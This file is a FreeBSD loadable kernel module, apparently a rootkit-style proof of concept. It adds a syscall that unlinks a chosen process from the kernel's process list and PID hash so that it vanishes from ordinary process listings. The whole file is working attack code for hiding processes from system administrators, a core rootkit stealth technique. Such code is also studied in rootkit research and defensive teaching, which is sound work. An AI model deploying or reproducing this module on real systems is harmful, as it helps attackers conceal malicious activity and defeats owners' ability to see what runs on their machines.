#include <sys/param.h>
#include <sys/types.h>
#include <sys/systm.h>
#include <sys/kernel.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <bsm/audit_kevents.h>
#include <sys/sysent.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/sx.h>
#include <sys/queue.h>

struct process_hiding_args {
	pid_t p_pid;
};

static int process_hiding(struct thread *td, void *syscall_args) {
	struct process_hiding_args *uap;
	uap = (struct process_hiding_args *)syscall_args;

	struct proc *p;
	sx_xlock(&allproc_lock);
	LIST_FOREACH(p, PIDHASH(uap->p_pid), p_hash) {
		if (p->p_pid == uap->p_pid) {
			PROC_LOCK(p);
			LIST_REMOVE(p, p_list);
			LIST_REMOVE(p, p_hash);
			PROC_UNLOCK(p);
			uprintf("Hiding process %d '%s'\n", p->p_pid, p->p_comm);
		}
	}

	sx_xunlock(&allproc_lock);

	return 0;
}

static struct sysent syscall_sysent = {
	.sy_narg = 1,
	.sy_call = process_hiding
};

static int syscall_no = NO_SYSCALL;

static int load(struct module *module, int cmd, void *arg) {
	int error = 0;

	switch(cmd) {
		case MOD_LOAD:
			uprintf("Process Hiding loaded as syscall #%d.\n", syscall_no);
			break;
		case MOD_UNLOAD:
			uprintf("Syscall #%d unloaded.\n", syscall_no);
			break;
		default:
			error = EOPNOTSUPP;
			break;
	}

	return error;
}

SYSCALL_MODULE(process_hiding, &syscall_no, &syscall_sysent, load, NULL);
